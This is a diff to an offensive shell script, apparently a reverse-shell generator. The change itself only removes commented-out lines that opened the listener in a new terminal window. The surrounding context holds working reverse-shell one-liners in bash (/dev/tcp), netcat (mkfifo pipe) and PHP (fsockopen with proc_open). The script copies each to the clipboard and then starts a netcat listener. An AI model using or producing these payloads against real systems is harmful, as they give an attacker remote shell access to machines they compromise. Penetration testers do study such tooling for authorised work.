@@ -107,7 +107,6 @@ if [ "$marg1" = "bash" ]; then
         echo -n "bash -c 'bash -i >& /dev/tcp/$line/$port 0>&1'" | xclip -selection clipboard; done < .ip.txt;
         echo "[+] Shell copied in clipboard";
         echo "[+] Opening listener into a new window";
-        #x-terminal-emulator -e nc -lnvp $port;
         nc -lnvp $port;
         rm .ip.txt;
         exit 1
@@ -127,7 +126,6 @@ elif [ "$marg1" = "nc" ]; then
         echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $line $port >/tmp/f" | xclip -selection clipboard; done < .ip.txt;
         echo "[+] Shell copied in clipboard";
         echo "[+] Opening listener into a new window";
-        #x-terminal-emulator -e nc -lnvp $port;
         nc -lnvp $port;
         rm .ip.txt;
         exit 1
@@ -147,7 +145,6 @@ elif [ "$marg1" = "php" ]; then
         echo "php -r '$sock=fsockopen(\"$line\"\,$port);$proc=proc_open(\"\/bin/bash -i\"\, array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'" | xclip -selection clipboard; done < .ip.txt;
         echo "[+] Shell copied in clipboard";
         echo "[+] Opening listener into a new window";
-        #x-terminal-emulator -e nc -lnvp $port;
         nc -lnvp $port;
         rm .ip.txt;
         exit 1
